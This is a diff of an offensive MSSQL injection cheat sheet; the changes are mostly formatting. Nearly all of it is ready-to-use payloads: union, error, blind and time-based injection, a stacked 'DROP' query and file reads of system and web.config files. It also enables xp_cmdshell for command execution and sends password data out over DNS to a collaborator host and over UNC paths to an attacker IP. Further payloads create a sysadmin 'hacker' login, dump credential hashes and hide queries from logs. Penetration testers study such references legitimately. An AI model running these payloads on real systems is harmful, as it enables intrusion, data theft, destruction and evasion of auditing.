@@ -1,7 +1,6 @@
 # MSSQL Injection
 
-> MSSQL Injection  is a type of security vulnerability that can occur when an attacker can insert or "inject" malicious SQL code into a query executed by a Microsoft SQL Server (MSSQL) database. This typically happens when user inputs are directly included in SQL queries without proper sanitization or parameterization. SQL Injection can lead to serious consequences such as unauthorized data access, data manipulation, and even gaining control over the database server. 
-
+> MSSQL Injection  is a type of security vulnerability that can occur when an attacker can insert or "inject" malicious SQL code into a query executed by a Microsoft SQL Server (MSSQL) database. This typically happens when user inputs are directly included in SQL queries without proper sanitization or parameterization. SQL Injection can lead to serious consequences such as unauthorized data access, data manipulation, and even gaining control over the database server.
 
 ## Summary
 
@@ -34,18 +33,16 @@
 * [MSSQL OPSEC](#mssql-opsec)
 * [References](#references)
 
-
 ## MSSQL Default Databases
 
 | Name                  | Description                           |
 |-----------------------|---------------------------------------|
-| pubs	                | Not available on MSSQL 2005           |
-| model	                | Available in all versions             |
-| msdb	                | Available in all versions             |
-| tempdb	            | Available in all versions             |
-| northwind	            | Available in all versions             |
-| information_schema	| Available from MSSQL 2000 and higher  |
-
+| pubs                 | Not available on MSSQL 2005           |
+| model                 | Available in all versions             |
+| msdb                 | Available in all versions             |
+| tempdb             | Available in all versions             |
+| northwind             | Available in all versions             |
+| information_schema | Available from MSSQL 2000 and higher  |
 
 ## MSSQL Comments
 
@@ -54,7 +51,6 @@
 | `/* MSSQL Comment */`      | C-style comment                   |
 | `--`                       | SQL comment                       |
 | `;%00`                     | Null byte                         |
-
 
 ## MSSQL Enumeration
 
@@ -73,7 +69,6 @@
 | User            | `SELECT user_name();`                     |
 | User            | `SELECT system_user;`                     |
 | User            | `SELECT user;`                            |
-
 
 ### MSSQL List Databases
 
@@ -107,7 +102,6 @@ SELECT table_name FROM information_schema.tables WHERE table_catalog='<DBNAME>'
 SELECT STRING_AGG(name, ', ') FROM master..sysobjects WHERE xtype = 'U';
 ```
 
-
 ### MSSQL List Columns
 
 ```sql
@@ -121,7 +115,6 @@ SELECT table_catalog, column_name FROM information_schema.columns
 
 SELECT COL_NAME(OBJECT_ID('<DBNAME>.<TABLE_NAME>'), <INDEX>)
 ```
-
 
 ## MSSQL Union Based
 
@@ -154,9 +147,8 @@ SELECT COL_NAME(OBJECT_ID('<DBNAME>.<TABLE_NAME>'), <INDEX>)
 * Finally extract the data
 
     ```sql
-    $ SELECT  UserId, UserName from Users
+    SELECT  UserId, UserName from Users
     ```
-
 
 ## MSSQL Error Based
 
@@ -181,7 +173,6 @@ SELECT COL_NAME(OBJECT_ID('<DBNAME>.<TABLE_NAME>'), <INDEX>)
     ' + cast((SELECT @@version) as int) + '
     ```
 
-
 ## MSSQL Blind Based
 
 ```sql
@@ -193,7 +184,6 @@ SELECT @@version WHERE @@version LIKE '%12.0.2000.8%'
 WITH data AS (SELECT (ROW_NUMBER() OVER (ORDER BY message)) as row,* FROM log_table)
 SELECT message FROM data WHERE row = 1 and message like 't%'
 ```
-
 
 ### MSSQL Blind With Substring Equivalent
 
@@ -209,7 +199,6 @@ AND UNICODE(SUBSTRING((SELECT 'A'),1,1))>64--
 AND SELECT SUBSTRING(table_name,1,1) FROM information_schema.tables > 'A'
 AND ISNULL(ASCII(SUBSTRING(CAST((SELECT LOWER(db_name(0)))AS varchar(8000)),1,1)),0)>90
 ```
-
 
 ## MSSQL Time Based
 
@@ -228,10 +217,10 @@ IF([INFERENCE]) WAITFOR DELAY '0:0:[SLEEPTIME]'
 IF 1=1 WAITFOR DELAY '0:0:5' ELSE WAITFOR DELAY '0:0:0';
 ```
 
-
 ## MSSQL Stacked Query
 
 * Stacked query without any statement terminator
+
     ```sql
     -- multiple SELECT statements
     SELECT 'A'SELECT 'B'SELECT 'C'
@@ -245,17 +234,16 @@ IF 1=1 WAITFOR DELAY '0:0:5' ELSE WAITFOR DELAY '0:0:0';
     ```
 
 * Use a semi-colon "`;`" to add another query
+
     ```sql
     ProductID=1; DROP members--
     ```
-
 
 ## MSSQL File Manipulation
 
 ### MSSQL Read File
 
 **Permissions**: The `BULK` option requires the `ADMINISTER BULK OPERATIONS` or the `ADMINISTER DATABASE BULK OPERATIONS` permission.
-
 
 ```sql
 OPENROWSET(BULK 'C:\path\to\file', SINGLE_CLOB)
@@ -267,13 +255,11 @@ Example:
 -1 union select null,(select x from OpenRowset(BULK 'C:\Windows\win.ini',SINGLE_CLOB) R(x)),null,null
 ```
 
-
 ### MSSQL Write File
 
 ```sql
 execute spWriteStringToFile 'contents', 'C:\path\to\', 'file'
 ```
-
 
 ## MSSQL Command Execution
 
@@ -294,7 +280,7 @@ EXEC sp_configure 'xp_cmdshell',1;
 RECONFIGURE;
 ```
 
-### Python Script 
+### Python Script
 
 > Executed by a different user than the one using `xp_cmdshell` to execute commands
 
@@ -304,26 +290,24 @@ EXECUTE sp_execute_external_script @language = N'Python', @script = N'print(__im
 EXECUTE sp_execute_external_script @language = N'Python', @script = N'print(open("C:\\inetpub\\wwwroot\\web.config", "r").read())'
 ```
 
-
 ## MSSQL Out of Band
 
 ### MSSQL DNS exfiltration
 
-Technique from https://twitter.com/ptswarm/status/1313476695295512578/photo/1
+Technique from [@ptswarm](https://twitter.com/ptswarm/status/1313476695295512578/photo/1)
 
-* **Permission**: Requires VIEW SERVER STATE permission on the server.
+* **Permission**: Requires `VIEW SERVER STATE` permission on the server.
 
     ```powershell
     1 and exists(select * from fn_xe_file_target_read_file('C:\*.xel','\\'%2b(select pass from users where id=1)%2b'.xxxx.burpcollaborator.net\1.xem',null,null))
     ```
 
-* **Permission**: Requires the CONTROL SERVER permission.
+* **Permission**: Requires the `CONTROL SERVER` permission.
 
     ```powershell
     1 (select 1 where exists(select * from fn_get_audit_file('\\'%2b(select pass from users where id=1)%2b'.xxxx.burpcollaborator.net\',default,default)))
     1 and exists(select * from fn_trace_gettable('\\'%2b(select pass from users where id=1)%2b'.xxxx.burpcollaborator.net\1.trc',default))
     ```
-
 
 ### MSSQL UNC Path
 
@@ -346,7 +330,6 @@ RESTORE LABELONLY FROM DISK = '\\attackerip\file'
 RESTORE REWINDONLY FROM DISK = '\\attackerip\file'
 RESTORE VERIFYONLY FROM DISK = '\\attackerip\file'
 ```
-
 
 ## MSSQL Trusted Links
 
@@ -379,7 +362,6 @@ EXECUTE('EXECUTE(''CREATE LOGIN hacker WITH PASSWORD = ''''P@ssword123.'''' '') 
 EXECUTE('EXECUTE(''sp_addsrvrolemember ''''hacker'''' , ''''sysadmin'''' '') AT "DOMINIO\SERVER1"') AT "DOMINIO\SERVER2"
 ```
 
-
 ## MSSQL Privileges
 
 ### MSSQL List Permissions
@@ -409,28 +391,28 @@ EXECUTE('EXECUTE(''sp_addsrvrolemember ''''hacker'''' , ''''sysadmin'''' '') AT 
     SELECT is_srvrolemember('sysadmin');
     ```
 
-
 ### MSSQL Make User DBA
 
 ```sql
 EXEC master.dbo.sp_addsrvrolemember 'user', 'sysadmin;
 ```
 
-
 ## MSSQL Database Credentials
 
 * **MSSQL 2000**: Hashcat mode 131: `0x01002702560500000000000000000000000000000000000000008db43dd9b1972a636ad0c7d4b8c515cb8ce46578`
+
     ```sql
     SELECT name, password FROM master..sysxlogins
     SELECT name, master.dbo.fn_varbintohexstr(password) FROM master..sysxlogins 
     -- Need to convert to hex to return hashes in MSSQL error message / some version of query analyzer
     ```
+
 * **MSSQL 2005**: Hashcat mode 132: `0x010018102152f8f28c8499d8ef263c53f8be369d799f931b2fbe`
+
     ```sql
     SELECT name, password_hash FROM master.sys.sql_logins
     SELECT name + '-' + master.sys.fn_varbintohexstr(password_hash) from master.sys.sql_logins
     ```
-
 
 ## MSSQL OPSEC
 
@@ -441,14 +423,13 @@ Use `SP_PASSWORD` in a query to hide from the logs like : `' AND 1=1--sp_passwor
 -- The text has been replaced with this comment for security reasons.
 ```
 
-
 ## References
 
-- [AWS WAF Clients Left Vulnerable to SQL Injection Due to Unorthodox MSSQL Design Choice - Marc Olivier Bergeron - June 21, 2023](https://www.gosecure.net/blog/2023/06/21/aws-waf-clients-left-vulnerable-to-sql-injection-due-to-unorthodox-mssql-design-choice/)
-- [Error based SQL Injection in "Order By" clause - Manish Kishan Tanwar - March 26, 2018](https://github.com/incredibleindishell/exploit-code-by-me/blob/master/MSSQL%20Error-Based%20SQL%20Injection%20Order%20by%20clause/Error%20based%20SQL%20Injection%20in%20“Order%20By”%20clause%20(MSSQL).pdf)
-- [Full MSSQL Injection PWNage - ZeQ3uL && JabAv0C - January 28, 2009](https://www.exploit-db.com/papers/12975)
-- [IS_SRVROLEMEMBER (Transact-SQL) - Microsoft - April 9, 2024](https://docs.microsoft.com/en-us/sql/t-sql/functions/is-srvrolemember-transact-sql?view=sql-server-ver15)
-- [MSSQL Injection Cheat Sheet - @pentestmonkey - August 30, 2011](http://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet)
-- [MSSQL Trusted Links - HackTricks - September 15, 2024](https://book.hacktricks.xyz/windows/active-directory-methodology/mssql-trusted-links)
-- [SQL Server - Link… Link… Link… and Shell: How to Hack Database Links in SQL Server! - Antti Rantasaari - June 6, 2013](https://blog.netspi.com/how-to-hack-database-links-in-sql-server/)
-- [sys.fn_my_permissions (Transact-SQL) - Microsoft - January 25, 2024](https://docs.microsoft.com/en-us/sql/relational-databases/system-functions/sys-fn-my-permissions-transact-sql?view=sql-server-ver15)
+* [AWS WAF Clients Left Vulnerable to SQL Injection Due to Unorthodox MSSQL Design Choice - Marc Olivier Bergeron - June 21, 2023](https://www.gosecure.net/blog/2023/06/21/aws-waf-clients-left-vulnerable-to-sql-injection-due-to-unorthodox-mssql-design-choice/)
+* [Error based SQL Injection in "Order By" clause - Manish Kishan Tanwar - March 26, 2018](https://github.com/incredibleindishell/exploit-code-by-me/blob/master/MSSQL%20Error-Based%20SQL%20Injection%20Order%20by%20clause/Error%20based%20SQL%20Injection%20in%20“Order%20By”%20clause%20(MSSQL).pdf)
+* [Full MSSQL Injection PWNage - ZeQ3uL && JabAv0C - January 28, 2009](https://www.exploit-db.com/papers/12975)
+* [IS_SRVROLEMEMBER (Transact-SQL) - Microsoft - April 9, 2024](https://docs.microsoft.com/en-us/sql/t-sql/functions/is-srvrolemember-transact-sql?view=sql-server-ver15)
+* [MSSQL Injection Cheat Sheet - @pentestmonkey - August 30, 2011](http://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet)
+* [MSSQL Trusted Links - HackTricks - September 15, 2024](https://book.hacktricks.xyz/windows/active-directory-methodology/mssql-trusted-links)
+* [SQL Server - Link… Link… Link… and Shell: How to Hack Database Links in SQL Server! - Antti Rantasaari - June 6, 2013](https://blog.netspi.com/how-to-hack-database-links-in-sql-server/)
+* [sys.fn_my_permissions (Transact-SQL) - Microsoft - January 25, 2024](https://docs.microsoft.com/en-us/sql/relational-databases/system-functions/sys-fn-my-permissions-transact-sql?view=sql-server-ver15)
